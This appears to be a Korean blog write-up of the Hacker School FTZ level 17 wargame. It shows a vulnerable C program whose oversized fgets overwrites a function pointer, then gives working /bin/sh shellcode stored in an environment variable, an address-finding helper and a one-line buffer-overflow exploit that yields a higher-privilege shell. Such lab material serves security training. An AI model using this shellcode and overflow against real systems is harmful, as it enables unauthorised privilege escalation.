---
layout: post
title: "Hacker School FTZ - Level 17"
description: "Do you know how to call the function (2)?"
comments: true
categories: [FTZ]
tags: [FTZ]
---

<img data-action="zoom" src='{{ "assets/ftz/level17/1.jpg" | relative_url }}' alt='relative'>  

## 1) level17/king poetic 입력해 로그인  

``` c
#include <stdio.h>

void printit() {
  printf("Hello there!\n");
}

main()
{ int crap;
  void (*call)()=printit;
  char buf[20];
  fgets(buf,48,stdin);
  setreuid(3098,3098);
  call();
}
```

<img data-action="zoom" src='{{ "assets/ftz/level17/2.png" | relative_url }}' alt='relative'>  

소스코드를 보면 앞선 16번 문제처럼 풀되 shell 함수의 주소 대신 shellcode가 저장된 주소를 call 함수에 대입하면 될 것으로 예상됩니다.  

<img data-action="zoom" src='{{ "assets/ftz/level17/3.png" | relative_url }}' alt='relative'>  

스택의 구조도 16번 문제와 비슷합니다.  

## 2) 환경변수에 shellcode 저장하고 shellcode가 저장된 환경변수의 주소 얻기  

``` bash
export EGG=`python -c 'print "\x90"*15+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`

cd tmp

echo 'int main() { printf("ADDR -> 0x%x\n", getenv("EGG")); }' > getenv.c

gcc -o getenv getenv.c

./getenv
```

<img data-action="zoom" src='{{ "assets/ftz/level17/4.png" | relative_url }}' alt='relative'>  

## 3) bof 일으키기  

``` bash
(python -c 'print "A"*40+"\x8d\xfc\xff\xbf"'; cat) | ./attackme
```

<img data-action="zoom" src='{{ "assets/ftz/level17/5.png" | relative_url }}' alt='relative'>  

getenv 프로그램을 실행시켜 얻은 주소로 bof 공격을 수행하니 level18 권한으로 shell을 실행시킬 수 있었고 level18의 비밀번호를 획득할 수 있었습니다.  